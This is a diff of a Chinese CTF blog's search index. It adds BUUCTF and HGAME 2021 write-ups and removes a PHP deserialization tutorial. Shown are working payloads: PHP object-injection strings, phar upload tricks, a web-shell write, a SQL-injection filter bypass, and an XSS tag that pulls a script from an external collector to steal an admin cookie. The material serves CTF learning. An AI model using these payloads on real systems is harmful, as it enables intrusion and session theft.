+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里就简单了，反序列化直接把file属性值设为<code>flag.php</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>于是构造完整的payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;4f9b10f1-69d5-4b66-b1d1-2b15bab7e939.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag。</p>
+]]></content>
+      <categories>
+        <category>WP</category>
+      </categories>
+  </entry>
+  <entry>
     <title>初。</title>
     <url>/2020/11/06/chu/</url>
     <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;故事要从我的童年讲起。</br></br><a id="more"></a></p>
@@ -18,150 +268,79 @@
       </categories>
   </entry>
   <entry>
-    <title>PHP反序列化漏洞总结</title>
-    <url>/2020/12/26/php1/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    本文主要总结php反序列化漏洞。为了总结全面一点，文中部分内容直接或间接引用于其他大牛的文章中，我都会标明出处，如有侵权，请发邮箱联系我删除。多有不合理之处，望大佬指点。</p>
-<h1 id="反序列化原理"><a href="#反序列化原理" class="headerlink" title="反序列化原理"></a>反序列化原理</h1><p>PHP序列化和反序列化主要是通过<code>serialize</code>  、<code>unserialize</code> 两个函数来分别实现，序列化就是将对象转换为可保存或传输的字符串的格式，反序列化就是把字符串格式恢复回原本的对象。在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。<a id="more"></a></p>
-<p>以下是一个php序列化的实例：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class DemoClass    	&#x2F;&#x2F;定义一个DemoClass类</span><br><span class="line">&#123;</span><br><span class="line">public $name  &#x3D; &#39;DemoClass&#39;;   &#x2F;&#x2F;定义一个name变量</span><br><span class="line">public $sex &#x3D; &quot;man&quot;;	&#x2F;&#x2F;定义一个sex变量</span><br><span class="line">public $age &#x3D; &quot;7&quot;; &#x2F;&#x2F;定义一个age变量</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$example &#x3D; new DemoClass();   &#x2F;&#x2F;创建一个对象</span><br><span class="line">$example-&gt;name &#x3D;&quot;John&quot;;</span><br><span class="line">$example-&gt;sex &#x3D; &quot;Woman&quot;;</span><br><span class="line">$example-&gt;age &#x3D; &quot;18&quot;  &#x2F;&#x2F;修改其中属性的值</span><br><span class="line"></span><br><span class="line">echo serialize($example)   &#x2F;&#x2F;返回序列化的结果</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+    <title>HGAME 2021 WP</title>
+    <url>/2021/03/02/hgame2021wp/</url>
+    <content><![CDATA[<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h3><p>网页代码中提示要把得到的信息放在<code>HEAD tag</code>中，所以猜测应该是修改http头部。</p>
+<p>先直接访问<code>HitchhikerGuide.php</code>，405错误，应该是请求方法不对，把GET改为POST，成功得到提示：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">只有使用&quot;无限非概率引擎&quot;(Infinite Improbability Drive)才能访问这里～</span><br></pre></td></tr></table></figure>
 
-<p>运行结果如下：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/1.png"></p>
+<a id="more"></a>这里我想了好久是什么意思，百度查了半天这个东西是什么意思，后来开窍了，HGAME的思路就是要中二，所以它就是一个浏览器，直接代替Firefox就行。后面跟着步骤修改头部信息就好。以下是完整头部修改结果：
+
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/1.png"></p>
+<p>得到flag。</p>
+<h3 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h3><p>没想到思路 ，在project.js里翻了半天，最终找到了base64编码的flag，应该不是预期解。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gameOverShowText: function (e, t) &#123;</span><br><span class="line">	if(e &gt; 1999)&#123;</span><br><span class="line">		alert(window.atob(&quot;aGdhbWV7ZG9feW91X2tub3dfY29jb3NfZ2FtZT99&quot;))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="智商检测鸡"><a href="#智商检测鸡" class="headerlink" title="智商检测鸡"></a>智商检测鸡</h3><p>在fuckmath.js中可以看到代码，直接尝试访问<code>/api/getFlag</code>来getFlag后得到一个假flag，还被出题师傅嘲讽了一番。。。</p>
+<p>我猜这道题的解法应该是在console里修改solving的值为100，可是我看不怎么懂js，更不会用console，瞎试了半天也没试出来。</p>
+<h3 id="宝藏走私者"><a href="#宝藏走私者" class="headerlink" title="宝藏走私者"></a>宝藏走私者</h3><p>开始一点都不会，网址还老崩，后来下线再上线后给了hint，原来是http走私啊。一波学习以后成功解出：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/2.png"></p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h3><p>签到题，先base64再base32再base16解码得到flag。</p>
+<h3 id="不起眼压缩包的养成的方法"><a href="#不起眼压缩包的养成的方法" class="headerlink" title="不起眼压缩包的养成的方法"></a>不起眼压缩包的养成的方法</h3><blockquote>
+<p>学到的知识：</p>
+<p>​        加密压缩包的一般处理方法：爆破、伪加密、明文攻击、CRC32碰撞</p>
+<p>reference：<a href="https://www.cnblogs.com/leixiao-/p/9824557.html">https://www.cnblogs.com/leixiao-/p/9824557.html</a></p>
+<p>reference：<a href="https://blog.csdn.net/qq_26187985/article/details/83654197">https://blog.csdn.net/qq_26187985/article/details/83654197</a></p>
+</blockquote>
+<p>得到一张图片，保存下来后用二进制编辑器打开，结尾有<code>.zip</code>格式的文件和一句提示：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Password is picture ID (Up to 8 digits)</span><br></pre></td></tr></table></figure>
+
+<p>百度查图片id得到的消息都是p站图片id，结合猜测这是p站的图，找到原图即可。百度识图得到原图id得到密码，原文件修改成<code>.zip</code>后解压得到新的<code>.zip</code>和提示：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sometimes we don&#39;t need to care about password.</span><br><span class="line">Because it&#39;s too strong or null. XD</span><br><span class="line">By the way, I only use storage.</span><br></pre></td></tr></table></figure>
+
+<p>刚开始我根据提示猜测是伪加密，后来发现行不通。</p>
+<p>之后查各种压缩包的处理方法，知道了明文攻击，才明白了提示的意思。</p>
+<p>将我们已知的txt文件压缩，只是用storage算法压缩，然后用ARCHPR进行明文攻击。</p>
+<p>在这里卡了很久，主要是由于很多压缩软件的压缩方法都不对，ARCHPR一直报错，卡了很久，最后用winRAR成功了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/3.png"></p>
+<p>打开之后还有一个加密压缩包，用二进制打开，看到很有规律的重复，猜测是某种编码。开始觉得是16进制，后来发现不大对，试了一堆之后发现是unicode，还需要自己补零。下面这里打错了，重复了一次 <code>_i5</code> 。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/4.png"></p>
+<h3 id="Galaxy"><a href="#Galaxy" class="headerlink" title="Galaxy"></a>Galaxy</h3><blockquote>
+<p>学到的知识：</p>
+<p>​        <code>.pcapng</code>格式文件的作用与处理方法；图片的一般隐写思路。</p>
+<p>reference：<a href="https://www.cnblogs.com/mq0036/p/11187138.html">https://www.cnblogs.com/mq0036/p/11187138.html</a></p>
+<p>reference：<a href="https://blog.csdn.net/attitudeisaltitude/article/details/81698719">https://blog.csdn.net/attitudeisaltitude/article/details/81698719</a></p>
+</blockquote>
+<p>下载文件，发现是一个<code>.pcapng</code>格式的文件。使用wireshark工具打开，发现大量192.168.43.146与192.168.43.199的握手，在其中抓到了<code>galaxy.png</code>，将其导出后，发现图片既不是压缩包，也没有藏图像，猜测是修改高度来隐写的。将高由3296修改成3496，flag出现。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/5.png"></p>
+<h3 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h3><p>文件是两个docx文档，一个上锁了，另一个打开之后没什么信息，后缀改为<code>.zip</code>后找到一个<code>password.xml</code>的文件，看格式可以知道是brianfuck密码，解密后得到密码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DOYOUKNOWHIDDEN?</span><br></pre></td></tr></table></figure>
+
+<p>打开第二个docx文档，由于密码的提示，我们在word选项里显示隐藏的文字，出现了几排空格。改成<code>.zip</code>里面有一堆我也不知道有啥用的文件。用十六进制编辑器打开看，发现结尾有brianfuck密码，应该就是对应那段空格。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/6.png"></p>
+<p>但是解密我解不出来，显示错误，而且如果是这样，第一处解出来的密码有什么用呢？卡在这里了。</p>
+<p>新思路：之前这个应该就是文档的密码而已，之前所谓的几排空格将其复制后粘贴到sublime里，看到了近似摩斯密码的文本，可是又不完全符合摩斯密码：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/7.png"></p>
+<p>啊我裂开，看了官方wp后才知道是snow隐写，题目图片给的提示被我忽略了，主要还是见得少，多长长见识吧。</p>
 <hr>
-<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>在php中，有一种叫做”魔术方法“的东西，我们在序列化和反序列化的过程中，可能会使用到其中的部分“魔法函数”，而这些函数在执行时就有可能为我们所利用。</p>
-<p>下面是比较典型的PHP反序列化漏洞中可能会用到的魔法函数：</p>
-<blockquote>
-<p> <strong>__wakeup</strong></p>
-<p> <code>unserialize</code>会检查是否存在一个_<code>wakeup</code>( ) 方法。如果存在，则会先调用_wakeup 方法，预先准备对象需要的资源。</p>
-<p> <strong>__construct</strong> </p>
-<p> 具有构造函数的类会在每次创建新对象时先调用此方法。</p>
-<p> <strong>__destruct</strong></p>
-<p> 析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p>
-<p> <strong>__toString</strong> </p>
-<p> 用于一个类被当成字符串时使用。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p>
-<p> <strong>__sleep</strong> </p>
-<p> 在对象在被序列化之前运行。</p>
-</blockquote>
-<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><ul>
-<li><p><strong>__wake up</strong>的绕过</p>
-<p><code>_wakeup</code>在<code>unserialize()</code>时自动调用，当序列化字符串表示对象属性个数的值大于真实个数的属性时，会跳过对<code>__wakeup</code>的执行。</p>
-<p>例如下面这道题：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/2.png"></p>
-<p>由代码可以看出，flag在<code>flag1.php</code>里，下面的<code>if else</code>里如果没有参数tryhackme就会打印本页源码，有的话则打印指定文件内容，    所以我们要利用<code>_wakeup()</code>绕过把file改成<code>flag1.php</code>。百度得知绕过的方法：</p>
-<blockquote>
-<p>_wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</p>
-</blockquote>
-<p>​    所以我们这么写：</p>
-<blockquote>
-<p>O:5:”SoFun”:2:{}</p>
-</blockquote>
-<p>只有一个对象，但是依然写2，就可以绕过了。</p>
-</li>
-</ul>
-<ul>
-<li><p><strong>__wakeup() 或__destruct()的利用</strong></p>
-<p>在<code>unserialize()</code>中会直接调用<code>wakeup()</code> 或<code>destruct()</code>，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码直接在<code>wakeup()</code>或<code>destruct()</code>中，从而当我们控制序列化字符串时就可以去直接触发它们。</p>
-<p>假设index源码如下：</p>
-</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		$fp=fopen(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">		fwrite($fp,<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class=$_GET[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> $class;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">$class_unser=unserialize($class);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;shell.php&quot;</span>;        <span class="comment">//包含shell.php文件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="200ok"><a href="#200ok" class="headerlink" title="200ok!"></a>200ok!</h3><p>该题考查sql注入。</p>
+<p>注入点是在header的status字段，这一点我没有验证出来；屏蔽了一些词和空格，我们用大小写绕过，空格用<code>/**/</code>来代替。</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Status: -1&#39; uniOn&#x2F;**&#x2F;seLect&#x2F;**&#x2F;ffffff14gggggg&#x2F;**&#x2F;fRom&#x2F;**&#x2F;f1111111144444444444g;#</span><br></pre></td></tr></table></figure>
 
-<p>​    基本的思路是，通过 <code>serialize()</code> 得到我们要的序列化字符串，之后再传进去。通过源代码知，把对象中的test值赋为 “<?php phpinfo();?>“,再调用<code>unserialize()</code>时会通过<code>__wakeup()</code>把test的写入到<code>shell.php</code>中。为此我们写个php脚本：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class a&#123;</span><br><span class="line">	var $test &#x3D; &#39;123&#39;;</span><br><span class="line">	function __wakeup()&#123;</span><br><span class="line">		$fp&#x3D;fopen(&quot;shell.php&quot;,&quot;w&quot;);</span><br><span class="line">		fwrite($fp,$this-&gt;test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class2&#x3D;new a();</span><br><span class="line">$class2-&gt;test&#x3D;&quot;&lt;?php phpinfo();?&gt;&quot;;</span><br><span class="line">$class2_ser&#x3D;serialize($class2);</span><br><span class="line">echo $class2_ser;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>得到flag。</p>
+<h3 id="Post-to-zuckonit"><a href="#Post-to-zuckonit" class="headerlink" title="Post to zuckonit"></a>Post to zuckonit</h3><p>这道题基本可以看出是XSS的考查，POST恶意代码，将其提交后得到管理员的cookie再用token访问<code>/flag</code>即可。</p>
+<p>经过尝试，<code>script</code>会被转换成<code>div</code>，可以用img标签，部分关键词双写绕过，如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Img sRC&#x3D;hthttptps:&#x2F;&#x2F;xss.pt&#x2F;vhFCp.jpg&gt;</span><br></pre></td></tr></table></figure>
 
-<p>结果如下：</p>
-<blockquote>
-<p>O:1:”a”:1:{s:4:”test”;s:18:”<?php phpinfo();?>”;}</p>
-</blockquote>
-<p>当我们传入的时候便触发了<code>_wakeup</code>，将一句话木马传入了<code>shell.php</code>中。</p>
-<ul>
-<li><p><strong>__construct()</strong></p>
-<p>有时候反序列化一个对象时，由它调用的<code>__wakeup()</code>中又去调用了其他的对象，由此我们可以一步步倒推，从尾至头找到漏洞点。</p>
-<blockquote>
-<p>以下示例引用自Cyzcc的博客：<a href="http://cyzcc.vip/2020/04/02/php-unserialize/">http://cyzcc.vip/2020/04/02/php-unserialize/</a></p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class CyzCc&#123;</span><br><span class="line">	function __construct($test)&#123;</span><br><span class="line">		$fp &#x3D; fopen(&quot;shell.php&quot;,&quot;w&quot;) ;</span><br><span class="line">		fwrite($fp,$test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">class Wc&#123;</span><br><span class="line">	var $test &#x3D; &#39;123&#39;;</span><br><span class="line">	function __wakeup()&#123;</span><br><span class="line">		$obj &#x3D; new CyzCc($this-&gt;test);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class5 &#x3D; $_GET[&#39;test&#39;];</span><br><span class="line">print_r($class5);</span><br><span class="line">echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">$class5_unser &#x3D; unserialize($class5);</span><br><span class="line">require &quot;shell.php&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 <code>_wakeup()</code>函数，从而在<code>new CyzCc</code>会自动调用对象<code>CyzCc</code>中的<code>construct()</code>方法，从而将<code>phpinfo()</code>写入到<code>shell.php</code>中。</p>
-<blockquote>
-<p>O:2:”Wc”:1:{s:4:”test”;s:18:”<?php phpinfo();?>;}</p>
-</blockquote>
-</li>
-</ul>
-<h2 id="绕过访问控制"><a href="#绕过访问控制" class="headerlink" title="绕过访问控制"></a>绕过访问控制</h2><p>访问控制的定义：</p>
-<blockquote>
-<p>PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。</p>
-<ul>
-<li><strong>public（公有）：</strong>公有的类成员可以在任何地方被访问。</li>
-<li><strong>protected（受保护）：</strong>受保护的类成员则可以被其自身以及其子类和父类访问。</li>
-<li><strong>private（私有）：</strong>私有的类成员则只能被其定义所在的类访问。</li>
-</ul>
-<p>——引自 菜鸟教程 “PHP 面向对象”</p>
-</blockquote>
-<p>当出现了<strong>protected</strong>或<strong>private</strong>时，我们可能会无法访问该属性或方法，这时就需要绕过这些访问控制了。</p>
-<ul>
-<li><p><strong>protected</strong></p>
-<p>用<code>/00*/00</code>（url中为<code>%00*%00</code>）来绕过。</p>
-<p>示例：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;类sofun中的proteced file属性绕过</span><br><span class="line">O:5:&quot;sofun&quot;:1:&#123;s:7:&quot;&#x2F;00*&#x2F;00file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>private</strong></p>
-<p>用<code>%00</code>来绕过。</p>
-<p>示例：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;类sofun中的private file属性绕过</span><br><span class="line">O:5:&quot;sofun&quot;:1:&#123;s:15:&quot;%00sofun%00file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-</li>
-</ul>
-<h1 id="phar实现php反序列化"><a href="#phar实现php反序列化" class="headerlink" title="phar实现php反序列化"></a>phar实现php反序列化</h1><p>phar（PHp ARchive）的解释是：like a Java JAR，but for PHP.   所以它本身其实是一个打包文件，是伪协议中的一种，和反序列化好像没有什么联系。</p>
-<p>然而在2018年8月，安全研究员 <strong>Sam Thomas</strong> 在   <code>BlackHat2018</code>大会  上分享了议题：<code>It’s a PHP unserialization vulnerability Jim, but not as we know it.</code>     其利用<strong>phar</strong>伪协议会将用户自定义的<strong>meta-data</strong>序列化的形式存储这一特性，扩展了php反序列化的攻击面。</p>
-<p>因此，我们是可以利用phar来实现php的反序列化的。用户自定义的meta-data会以序列化形式存储在phar文件中的manifest部分；当使用phar://协议来解析phar文件时，便会对phar文件中的manifest部分进行反序列化。</p>
-<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><h3 id="phar结构"><a href="#phar结构" class="headerlink" title="phar结构"></a>phar结构</h3><p>phar由四个部分组成。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.stub</span><br><span class="line">	phar 扩展识别的标志 格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt;  只有结尾是__HALT_COMPILER();?&gt;才会被php识别为是一个phar。</span><br><span class="line"></span><br><span class="line">2.manifest</span><br><span class="line">	phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这里即为反序列化漏洞点。</span><br><span class="line"></span><br><span class="line">3.contents</span><br><span class="line">	压缩文件的内容</span><br><span class="line"></span><br><span class="line">4.signature</span><br><span class="line">	文件的签名内容</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="phar文件生成"><a href="#phar文件生成" class="headerlink" title="phar文件生成"></a>phar文件生成</h3><p>我们来自己构建一个<code>phar</code>文件，<code>php</code>内置了一个<code>Phar</code>类。<br> <strong>注意：需要将<code>php.ini</code>中的<code>phar.readonly</code>设置成off。</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#eval.class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $val;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$val</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;val = $val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        assert(<span class="keyword">$this</span>-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># phar_gen.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;Evil.class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$exception = <span class="keyword">new</span> Evil(<span class="string">&#x27;phpinfo()&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;vul.phar&quot;</span>);		<span class="comment">//定义phar文件的文件名</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;startBuffering();		<span class="comment">// 启动缓冲Phar写操作</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);		<span class="comment">//以字符串的形式添加一个文件到 phar 档案</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;&lt;?php__HALT_COMPILER(); ?&gt;&quot;</span>);		<span class="comment">//设置存根，即设置a stub的内容</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;setMetadata($exception);			<span class="comment">//设置phar归档元数据</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();			<span class="comment">//停止缓冲对Phar归档文件的写请求，并将更改保存到磁盘</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>然后我们用二进制编辑器打开生成文件，如下图：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/3.png"></p>
-<p>可以看到其中的一段序列化文本，就是<code>meta-data</code>序列化的结果。</p>
-<h3 id="phar-反序列化"><a href="#phar-反序列化" class="headerlink" title="phar://反序列化"></a><code>phar://</code>反序列化</h3><p>那么，如何利用<code>phar://</code>进行反序列化呢？</p>
-<p>使用<code>phra://</code>伪协议读取文件的时候，文件会被解析成phar对象，这个时候，刚才那部分的序列化的信息就会被反序列化。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;Evil.class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( file_exists($_REQUEST[<span class="string">&#x27;url&#x27;</span>]) ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;success!&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;error!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>访问test.php， <code>http://127.0.0.1/test.php?url=phar://vul.phar</code>，得下图：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/4.png"></p>
-<h2 id="漏洞的简单利用"><a href="#漏洞的简单利用" class="headerlink" title="漏洞的简单利用"></a>漏洞的简单利用</h2><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，即<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。采用这种方法可以绕过很大一部分上传检测。</p>
-<p>下面这道题目就利用了这个漏洞：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/5.png"></p>
-<p>我们写一个php来建一个phar。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funny</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$exception = <span class="keyword">new</span> funny();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;flag.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;&lt;?php__HALT_COMPILER(); ?&gt;&quot;</span>);<span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;setMetadata($exception);<span class="comment">//将自定义的meta-data存入mainfest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>php文件系统大部分函数再通过phar://解析时，会对meta-data反序列化，从而达到我们的目的。</p>
-<p>访问该php得到了flag.php。</p>
-<p>进linux对phar进行cat发现是乱码，原来是因为phar是一个data文件。其原因是data会被base64解密一次，只要再data加密就可以cat了。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/6.png"></p>
-<p>我们再对其进行urlencode，防止加号被吃，然后就可以上传了。</p>
-<p>我们得到了txt文件，问了大佬才知道只要是phar://协议解析，后缀是什么都无所谓，我之前甚至都没有想过这个问题。。。</p>
-<p>然后我们就拿到flag啦。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/7.png"></p>
-<p>我们得到了txt文件，因为这里的后缀<code>.txt</code>是不会影响反序列化操作的，我们就成功拿到flag啦。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/8.png"></p>
